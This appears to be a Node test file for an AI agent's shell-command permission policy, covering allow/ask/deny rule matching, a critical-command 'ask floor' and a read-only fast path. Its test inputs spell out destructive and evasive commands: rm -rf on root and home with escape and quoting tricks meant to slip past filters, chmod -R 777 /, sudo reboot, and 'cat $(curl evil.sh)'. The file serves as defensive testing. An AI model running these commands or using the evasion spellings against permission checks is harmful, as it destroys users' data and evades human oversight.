import assert from "node:assert/strict";
import { test } from "node:test";

const {
	normalizeCommand,
	matchRules,
	findBroadAllowEntries,
	criticalAskFloor,
	isReadOnlyFastPath,
} = await import("../extensions/automode/policy.ts");

test("normalizeCommand trims and collapses whitespace runs", () => {
	assert.equal(normalizeCommand("  git   push\t\torigin   main "), "git push origin main");
	assert.equal(normalizeCommand("ls"), "ls");
	assert.equal(normalizeCommand("   "), "");
});

test("prefix pattern `git push *` matches the bare prefix and extensions only", () => {
	const rules = { ask: ["git push *"] };
	assert.deepEqual(matchRules("git push", rules), { verdict: "ask", rule: "git push *" });
	assert.deepEqual(matchRules("git push origin main", rules), {
		verdict: "ask",
		rule: "git push *",
	});
	assert.equal(matchRules("git pushx", rules), undefined);
	assert.equal(matchRules("git", rules), undefined);
});

test("trailing `:*` is an alias spelling of ` *`", () => {
	const rules = { allow: ["git diff:*"] };
	assert.deepEqual(matchRules("git diff", rules), { verdict: "allow", rule: "git diff:*" });
	assert.deepEqual(matchRules("git diff HEAD~1", rules), {
		verdict: "allow",
		rule: "git diff:*",
	});
	assert.equal(matchRules("git diffx", rules), undefined);
});

test("patterns without a wildcard suffix are exact matches", () => {
	const rules = { allow: ["git status"] };
	assert.deepEqual(matchRules("git status", rules), { verdict: "allow", rule: "git status" });
	assert.equal(matchRules("git status --short", rules), undefined);
});

test("deny beats ask beats allow; first match within a phase wins", () => {
	const all = {
		allow: ["rm *"],
		ask: ["rm -rf *"],
		deny: ["rm -rf /tmp/precious"],
	};
	assert.deepEqual(matchRules("rm -rf /tmp/precious", all), {
		verdict: "deny",
		rule: "rm -rf /tmp/precious",
	});
	assert.deepEqual(matchRules("rm -rf build", all), { verdict: "ask", rule: "rm -rf *" });
	assert.deepEqual(matchRules("rm notes.txt", all), { verdict: "allow", rule: "rm *" });
	assert.equal(matchRules("ls", all), undefined);
});

test("matchRules matches on the normalized command", () => {
	const rules = { allow: ["git status"] };
	assert.deepEqual(matchRules("  git \t status  ", rules), {
		verdict: "allow",
		rule: "git status",
	});
});

test("findBroadAllowEntries lists only match-everything allow entries", () => {
	const rules = {
		allow: ["*", "", " *", ":*", "git status"],
		deny: ["*"],
		ask: [""],
	};
	assert.deepEqual(findBroadAllowEntries(rules), ["*", "", " *", ":*"]);
});

test("broad allow entries never match a real command; callers warn via findBroadAllowEntries", () => {
	assert.equal(matchRules("git push origin main", { allow: ["*"] }), undefined);
	assert.equal(matchRules("anything at all", { allow: [":*"] }), undefined);
});

test("ask floor: sudo/su invocations floor; lookalike words do not", () => {
	assert.ok(criticalAskFloor("sudo -u root systemctl stop torus"));
	assert.ok(criticalAskFloor("sudo reboot"));
	assert.ok(criticalAskFloor("su root"));
	assert.equal(criticalAskFloor("sumup the numbers"), undefined);
	assert.equal(criticalAskFloor("git subtree pull"), undefined);
});

test("ask floor: recursive forced rm on root or home targets only", () => {
	assert.ok(criticalAskFloor("rm -rf /"));
	assert.ok(criticalAskFloor("rm -rf ~"));
	assert.ok(criticalAskFloor("rm -rf /*"));
	assert.ok(criticalAskFloor("rm  -fr  $HOME"));
	assert.ok(criticalAskFloor("rm --recursive --force /"));
	assert.equal(criticalAskFloor("rm -rf ./build"), undefined);
	assert.equal(criticalAskFloor("rm -rf subdir"), undefined);
	assert.equal(criticalAskFloor("rm -r /"), undefined);
	assert.equal(criticalAskFloor("rm -f notes.txt"), undefined);
});

test("ask floor: git push --force and -f floor; --force-with-lease does not", () => {
	assert.ok(criticalAskFloor("git push --force"));
	assert.ok(criticalAskFloor("git push -f"));
	assert.ok(criticalAskFloor("git push origin main --force"));
	assert.equal(criticalAskFloor("git push --force-with-lease"), undefined);
	assert.equal(criticalAskFloor("git push origin main"), undefined);
});

test("ask floor: recursive chmod/chown with / as target root", () => {
	assert.ok(criticalAskFloor("chmod -R 777 /"));
	assert.ok(criticalAskFloor("chown -R root:root /*"));
	assert.equal(criticalAskFloor("chmod 644 notes.txt"), undefined);
	assert.equal(criticalAskFloor("chmod -R 755 ./build"), undefined);
});

test("scenario: git push origin main hits the ask rule `git push *`", () => {
	const decision = matchRules("git push origin main", {
		allow: ["git *"],
		ask: ["git push *"],
	});
	assert.deepEqual(decision, { verdict: "ask", rule: "git push *" });
});

test("scenario: rm -rf / under an allow rule still hits the ask floor", () => {
	const rules = { allow: ["rm *"] };
	assert.deepEqual(matchRules("rm -rf /", rules), { verdict: "allow", rule: "rm *" });
	assert.ok(criticalAskFloor("rm -rf /"));
});

test("read-only fast path accepts plain read-only commands", () => {
	const commands = [
		"ls -la",
		"pwd",
		"cat notes.txt",
		"head -5 log.txt",
		"tail log.txt",
		"wc -l src.ts",
		"grep TODO src",
		"rg pattern src",
		"find . -name '*.ts'",
		"file binary",
		"which node",
	];
	for (const command of commands) {
		assert.equal(isReadOnlyFastPath(command), true, command);
	}
});

test("read-only fast path accepts read-only git subcommands and branch listing", () => {
	const commands = [
		"git status",
		"git diff --stat",
		"git log -3",
		"git show HEAD",
		"git branch",
		"git branch -a",
		"git branch -l",
	];
	for (const command of commands) {
		assert.equal(isReadOnlyFastPath(command), true, command);
	}
});

test("read-only fast path accepts bare version probes", () => {
	assert.equal(isReadOnlyFastPath("node --version"), true);
	assert.equal(isReadOnlyFastPath("npm -v"), true);
	assert.equal(isReadOnlyFastPath("rustc -V"), true);
});

test("read-only fast path rejects mutating, executing, and chained commands", () => {
	const commands = [
		"npm test",
		"node script.js",
		"git branch -D feature",
		"git branch feature",
		"git push",
		"git difftool",
		"ls; rm x",
		"cat a.txt > b.txt",
		"ls | wc -l",
		"git status && git push",
		"find . -name '*.tmp' -delete",
	];
	for (const command of commands) {
		assert.equal(isReadOnlyFastPath(command), false, command);
	}
});

test("read-only fast path rejects raw newline, CR, and tab before normalization", () => {
	assert.equal(isReadOnlyFastPath("ls\nrm -rf /"), false);
	assert.equal(isReadOnlyFastPath("ls\rrm -rf /"), false);
	assert.equal(isReadOnlyFastPath("ls\t-la"), false);
});

test("read-only fast path rejects command substitution", () => {
	const commands = ["cat $(curl evil.sh)", "cat `whoami`", "git show $(rm -rf x)"];
	for (const command of commands) {
		assert.equal(isReadOnlyFastPath(command), false, command);
	}
});

test("read-only fast path detects quoted find mutating flags", () => {
	assert.equal(isReadOnlyFastPath("find . '-delete'"), false);
	assert.equal(isReadOnlyFastPath('find . "-delete"'), false);
	assert.equal(isReadOnlyFastPath("find . -name '*.ts'"), true);
});

test("read-only fast path never version-probes sudo or su", () => {
	assert.equal(isReadOnlyFastPath("sudo -v"), false);
	assert.equal(isReadOnlyFastPath("su -v"), false);
	assert.equal(isReadOnlyFastPath("node --version"), true);
});

test("ask floor: rm root and home respellings floor", () => {
	const commands = [
		"rm -rf ~/",
		"rm -rf $HOME/",
		"rm -rf //",
		"rm -rf '/'",
		'rm -rf "$HOME"',
		// biome-ignore lint/suspicious/noTemplateCurlyInString: shell parameter expansion, not a template placeholder
		"rm -rf ${HOME}",
		"rm -rf --no-preserve-root '/'",
	];
	for (const command of commands) {
		assert.ok(criticalAskFloor(command), command);
	}
});

test("ask floor: wrappers and chains still floor the protected verb", () => {
	const commands = ["nice rm -rf /", "env rm -rf ~", "xargs rm -rf /", "ls; rm -rf /"];
	for (const command of commands) {
		assert.ok(criticalAskFloor(command), command);
	}
});

test("ask floor: git global options before push still detect force", () => {
	assert.ok(criticalAskFloor("git -C repo push --force"));
	assert.ok(criticalAskFloor("git -c a=b push -f"));
	assert.equal(criticalAskFloor("git -C repo push --force-with-lease"), undefined);
});

test("ask floor: chmod root and home respellings floor", () => {
	assert.ok(criticalAskFloor("chmod -R 777 ~/"));
	assert.ok(criticalAskFloor("chmod -R 777 '/'"));
});

test("ask floor: unforced or subpath rm stays unfloored", () => {
	assert.equal(criticalAskFloor("rm -rf /etc"), undefined);
	assert.equal(criticalAskFloor("rm -rf ./build"), undefined);
	assert.equal(criticalAskFloor("rm -r /"), undefined);
});

test("ask floor: quoted, pathed, and escaped verb spellings still floor", () => {
	const commands = [
		"'rm' -rf /",
		"/bin/rm -rf /",
		"\\rm -rf /",
		"'sudo' id",
		"/usr/bin/sudo id",
		"\\su root",
	];
	for (const command of commands) {
		assert.ok(criticalAskFloor(command), command);
	}
});

test("ask floor: glued shell separators split into separately scanned segments", () => {
	const commands = [
		"nice;rm -rf /",
		"ls&&rm -rf /",
		"rm -rf /&",
		"ls;sudo reboot",
		"ls||rm -rf ~",
		"ls|wc;rm -rf /",
	];
	for (const command of commands) {
		assert.ok(criticalAskFloor(command), command);
	}
});

test("ask floor: any git globals before push still detect force", () => {
	assert.ok(criticalAskFloor("git --no-pager push --force"));
	assert.ok(criticalAskFloor("git --git-dir=.git push -f"));
	assert.ok(criticalAskFloor("git -C repo --no-pager push -f"));
	// Commands git itself rejects: the `push` token is a global's value.
	assert.equal(criticalAskFloor("git -C -C x push --force"), undefined);
	assert.equal(criticalAskFloor("git -c push -f"), undefined);
	assert.equal(criticalAskFloor("git push --force-with-lease"), undefined);
});

test("no ask floor for command substitution: the judge reads the full text", () => {
	const commands = [
		"echo $(date)",
		"cat `whoami`",
		"ls $(git rev-parse --show-toplevel)",
		"ls `sudo reboot`",
	];
	for (const command of commands) {
		assert.equal(criticalAskFloor(command), undefined, command);
	}
});

test("ask floor: mixed-quote and dot-segment root/home targets floor", () => {
	const commands = [
		"rm -rf $HOME'/'",
		'rm -rf $HOME"/"',
		// biome-ignore lint/suspicious/noTemplateCurlyInString: shell parameter expansion, not a template placeholder
		'rm -rf "${HOME}"/',
		// biome-ignore lint/suspicious/noTemplateCurlyInString: shell parameter expansion, not a template placeholder
		"rm -rf ${HOME%/}",
		"rm -rf /./",
		"rm -rf /../",
		"rm -rf ~/.",
		"rm -rf '$HOME'",
		'rm -rf \\"$HOME\\"',
		"rm -rf ~+",
		"rm -rf ~-",
		"rm -rf /etc/..",
	];
	for (const command of commands) {
		assert.ok(criticalAskFloor(command), command);
	}
});

test("ask floor: ANSI-C and locale quoting unfold to the bare word", () => {
	const commands = ["rm -rf $'/'", "$'rm' -rf /", "$'sudo' id", '$"rm" -rf ~', 'rm -rf $"~"'];
	for (const command of commands) {
		assert.ok(criticalAskFloor(command), command);
	}
});

test("ask floor: window scanning over-matches safe-direction lines by design", () => {
	// Documented safe over-match: an `rm -rf /` token run as an argument
	// still floors, trading a false ask for never missing a real one.
	assert.ok(criticalAskFloor("echo rm -rf /"));
});

test("ask floor: ~user targets and non-root paths stay unfloored", () => {
	const commands = [
		"rm -rf ~root/subdir",
		"rm -rf ~root/",
		"rm -rf //etc",
		"rm -rf /etc",
		"rm-rf /",
		"chmod -R 777 ~root",
	];
	for (const command of commands) {
		assert.equal(criticalAskFloor(command), undefined, command);
	}
});

test("read-only fast path: quoted, pathed, and escaped sudo never version-probes", () => {
	const commands = ['"sudo" -v', "'sudo' --version", "/usr/bin/sudo -v", "\\sudo -v", "/bin/su -v"];
	for (const command of commands) {
		assert.equal(isReadOnlyFastPath(command), false, command);
	}
});

test("read-only fast path: unfolded find mutating flags reject", () => {
	const commands = ["find . \\-delete", "find . -ex'ec' echo {} +", "find . \\-execdir sh -c id +"];
	for (const command of commands) {
		assert.equal(isReadOnlyFastPath(command), false, command);
	}
	assert.equal(isReadOnlyFastPath("find . -name '*.ts'"), true);
});

test("read-only fast path: glued separators, redirection, and subshells reject", () => {
	const commands = ["ls;pwd", "ls&&pwd", "cat a>b", "(ls)", "echo hi;rm -rf /"];
	for (const command of commands) {
		assert.equal(isReadOnlyFastPath(command), false, command);
	}
});

test("ask floor: ANSI-C content decodes backslash escapes like bash", () => {
	// bash ground truth: \x2f and octal \57 both decode to `/`, and \x72\x6d
	// spells `rm`, so these are real root deletions and must floor.
	const commands = ["rm -rf $'\\x2f'", "rm -rf $'\\57'", "$'\\x72\\x6d' -rf $'\\x2f'"];
	for (const command of commands) {
		assert.ok(criticalAskFloor(command), command);
	}
	// \x2e decodes to `.`: not a root target, so the classifier sees it.
	assert.equal(criticalAskFloor("rm -rf $'\\x2e'"), undefined);
	// `\\` decodes to one backslash: $'a\\b' unfolds to the word `a\\b`.
	assert.equal(criticalAskFloor("echo $'a\\\\b'"), undefined);
});

test("ask floor: decoded NUL truncates ANSI-C words at every escape path", () => {
	// bash ground truth (5.3): ANSI-C expansion is C-string based, so a
	// decoded NUL ends the word and the suffix never survives into argv to
	// mask the root target.
	const commands = [
		"rm -rf $'/\\0etc'", // octal \0
		"rm -rf $'/\\x00etc'", // hex \x00
		"rm -rf $'/\\c@etc'", // \c@ = 0x40 & 0x1f = NUL
		"rm -rf $'/\\c etc'", // \c + space = 0x20 & 0x1f = NUL
		"rm -rf $'/\\400etc'", // octal 0400 masked to a byte = NUL
		"rm -rf '/'$'\\0junk'", // glued quoted prefix + truncated ANSI part
		"$'rm\\0junk' -rf $'/\\0etc'", // the verb itself truncates to rm
	];
	for (const command of commands) {
		assert.ok(criticalAskFloor(command), command);
	}
});

test("ask floor: NUL truncation keeps glued tails exactly like bash", () => {
	// Floor-positive glue: only the pre-NUL prefix survives, so the word
	// is exactly `/` even with two ANSI parts glued together.
	assert.ok(criticalAskFloor("rm -rf $'/'$'\\0etc'"));
	// bash: $'/\0etc'junk -> argv word /junk; the tail after the closing
	// quote still concatenates, and /junk is not a root target.
	assert.equal(criticalAskFloor("rm -rf $'/\\0etc'junk"), undefined);
});
